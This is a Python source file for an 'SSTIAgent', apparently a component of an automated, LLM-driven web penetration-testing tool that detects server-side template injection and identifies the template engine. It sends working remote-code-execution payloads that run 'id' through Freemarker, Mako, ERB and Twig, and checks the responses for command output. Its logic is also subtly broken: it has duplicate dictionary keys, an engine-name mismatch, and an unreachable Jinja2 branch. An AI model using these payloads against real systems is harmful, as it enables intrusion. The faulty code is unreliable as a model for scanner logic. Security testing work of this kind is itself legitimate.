"""
SSTIAgent — Server-Side Template Injection detection with engine identification.

Multi-stage testing:
1. Detection phase — Mathematical probes to detect template injection
2. Engine identification — Engine-specific probes (Jinja2, Twig, Freemarker, etc.)
3. Exploitation verification — Confirm RCE capability based on detected engine
"""

import httpx
from rich.console import Console
from agents.base import BaseAgent

console = Console()


class SSTIAgent(BaseAgent):
    model = "claude-haiku-4-5-20251001"
    max_iterations = 20
    vuln_type = "ssti"
    agent_name = "SSTIAgent"
    allowed_tools = ["validate_finding"]
    system_prompt = """\
You are a Server-Side Template Injection (SSTI) specialist. Test ONLY for SSTI vulnerabilities.

You will receive an attack surface map. For each endpoint with parameters:
1. Call validate_finding with vuln_type="ssti", the endpoint URL, and the parameter name
2. Always pass method (GET or POST) as found in the attack surface
3. For form-based endpoints, include extra_params like {"Submit": "Submit"}
4. If validated=true — confirmed, move to next parameter
5. If validated=false — move to next parameter

Rules:
- Test ONLY ssti — ignore everything else
- Test every parameter on every endpoint (reflected and stored inputs)
- Stop when all parameters are tested
- Do not repeat tests you already ran
"""

    def _deterministic_test(self, endpoint, config, state) -> list:
        """
        Override deterministic test for SSTI detection with engine identification.

        Args:
            endpoint: Endpoint object with url, method, params, body_fields
            config: Config object with cookies, auth_headers
            state: ScanState object

        Returns:
            List of finding dicts with detected engine information
        """
        findings = []

        # Build headers from config
        headers = {"User-Agent": "pentest-agent/1.0"}
        if config.cookies:
            headers["Cookie"] = config.cookies
        if hasattr(config, 'auth_headers') and config.auth_headers:
            headers.update(config.auth_headers)

        # Get parameters to test
        params_to_test = []
        if endpoint.params:
            params_to_test.extend(endpoint.params)
        if endpoint.body_fields:
            params_to_test.extend(endpoint.body_fields)

        if not params_to_test:
            params_to_test = [""]

        # Create HTTP client
        client = httpx.Client(timeout=15, verify=False, headers=headers)

        try:
            for param in params_to_test:
                # Test for SSTI with engine detection
                result = self._test_ssti_param(
                    client=client,
                    url=endpoint.url,
                    method=endpoint.method,
                    param=param,
                )

                if result:
                    # Enhance with default severity
                    result["severity"] = "Critical"
                    result["source"] = self.agent_name
                    result["vuln_type"] = "ssti"
                    result["param_name"] = param
                    findings.append(result)
                    console.print(
                        f"  [bold red][{self.agent_name}] CONFIRMED SSTI "
                        f"(engine: {result.get('evidence', 'unknown')}) @ {param}[/]"
                    )
        finally:
            client.close()

        return findings

    def _test_ssti_param(self, client: httpx.Client, url: str, method: str, param: str) -> dict:
        """
        Test a single parameter for SSTI with multi-stage engine detection.

        Returns: Finding dict if SSTI confirmed, None otherwise
        """
        # Stage 1: Detection probes
        detection_probes = {
            "jinja2_math": "{{7*7}}",
            "freemarker_math": "${7*7}",
            "erb_hash": "#{7*7}",
            "erb_tag": "<%= 7*7 %>",
            "jinja2_string": "{{7*'7'}}",
        }

        detected_engine = None
        detected_probe = None

        for engine, probe in detection_probes.items():
            try:
                resp = self._send_probe(client, url, method, param, probe)

                # Check for mathematical result
                if "49" in resp.text:
                    if engine == "jinja2_string":
                        # Jinja2 string multiplication produces '7777777'
                        if "7777777" in resp.text:
                            detected_engine = "jinja2"
                            detected_probe = probe
                            break
                    else:
                        detected_engine = engine.split("_")[0].capitalize()
                        detected_probe = probe
                        break
            except Exception:
                continue

        if not detected_engine:
            return None

        # Stage 2: Engine-specific identification
        engine_confirmation = self._confirm_engine(
            client=client,
            url=url,
            method=method,
            param=param,
            engine=detected_engine,
        )

        # Stage 3: Exploitation verification
        exploit_payload = self._get_exploit_payload(detected_engine)
        if exploit_payload:
            try:
                resp = self._send_probe(client, url, method, param, exploit_payload)
                if self._check_rce_response(resp, detected_engine):
                    return {
                        "validated": True,
                        "type": f"SSTI: {detected_engine.capitalize()}",
                        "url": url,
                        "param_name": param,
                        "method": method,
                        "payload": detected_probe,
                        "evidence": f"Template injection detected via {detected_probe}. "
                                  f"Engine identified: {detected_engine}. "
                                  f"RCE capable: True. "
                                  f"Confirmation: {engine_confirmation}",
                    }
            except Exception:
                pass

        # Return finding even without full RCE verification
        if detected_engine:
            return {
                "validated": True,
                "type": f"SSTI: {detected_engine.capitalize()}",
                "url": url,
                "param_name": param,
                "method": method,
                "payload": detected_probe,
                "evidence": f"Template injection detected via {detected_probe}. "
                          f"Engine: {detected_engine}. "
                          f"Confirmation: {engine_confirmation}",
            }

        return None

    def _send_probe(self, client: httpx.Client, url: str, method: str, param: str, payload: str) -> httpx.Response:
        """
        Send a probe payload to the endpoint.

        Args:
            client: httpx.Client instance
            url: Target URL
            method: HTTP method (GET/POST)
            param: Parameter name
            payload: Payload to send

        Returns:
            Response object
        """
        if method.upper() == "GET":
            return client.get(url, params={param: payload})
        else:
            # Try JSON first, fall back to form data
            try:
                return client.post(url, json={param: payload})
            except Exception:
                return client.post(url, data={param: payload})

    def _confirm_engine(self, client: httpx.Client, url: str, method: str, param: str, engine: str) -> str:
        """
        Send engine-specific probes to confirm template engine.

        Returns: Confirmation description
        """
        confirmations = {
            "Jinja2": {
                "probe": "{{config}}",
                "indicators": ["Config", "config", "class"],
            },
            "Jinja2": {
                "probe": "{{_self.env}}",
                "indicators": ["Environment", "environment"],
            },
            "Freemarker": {
                "probe": "${.version}",
                "indicators": ["version", "freemarker"],
            },
            "Mako": {
                "probe": "${7*7}",
                "indicators": ["49", "Mako"],
            },
            "Twig": {
                "probe": "{{_self.env.registerUndefinedFilterCallback('system')}}",
                "indicators": ["uid=", "bin/", "root"],
            },
        }

        for eng, config in confirmations.items():
            if eng.lower() != engine.lower():
                continue

            try:
                resp = self._send_probe(client, url, method, param, config["probe"])
                for indicator in config["indicators"]:
                    if indicator.lower() in resp.text.lower():
                        return f"Confirmed via {config['probe']} → found '{indicator}'"
            except Exception:
                pass

        return "Detection via mathematical probe"

    def _get_exploit_payload(self, engine: str) -> str:
        """
        Get RCE payload for confirmed engine.

        Args:
            engine: Detected template engine

        Returns:
            Exploit payload string
        """
        payloads = {
            "Jinja2": "{{''.__class__.__mro__[1].__subclasses__()}}",
            "Jinja2": "{{''.__class__}}",
            "Twig": "{{_self.env.getFilter('system')}}",
            "Freemarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "Mako": "${__import__('os').popen('id').read()}",
            "ERB": "<%= system('id') %>",
        }

        return payloads.get(engine, "")

    def _check_rce_response(self, resp: httpx.Response, engine: str) -> bool:
        """
        Check if response indicates successful RCE.

        Args:
            resp: Response object
            engine: Template engine name

        Returns:
            True if RCE indicators found
        """
        rce_indicators = {
            "Jinja2": ["__class__", "__mro__", "__subclasses__", "str"],
            "Twig": ["uid=", "gid=", "groups=", "root", "bin"],
            "Freemarker": ["uid=", "gid=", "freemarker"],
            "Mako": ["uid=", "gid=", "root"],
            "ERB": ["uid=", "gid=", "root"],
        }

        indicators = rce_indicators.get(engine, [])
        for indicator in indicators:
            if indicator in resp.text:
                return True

        return False
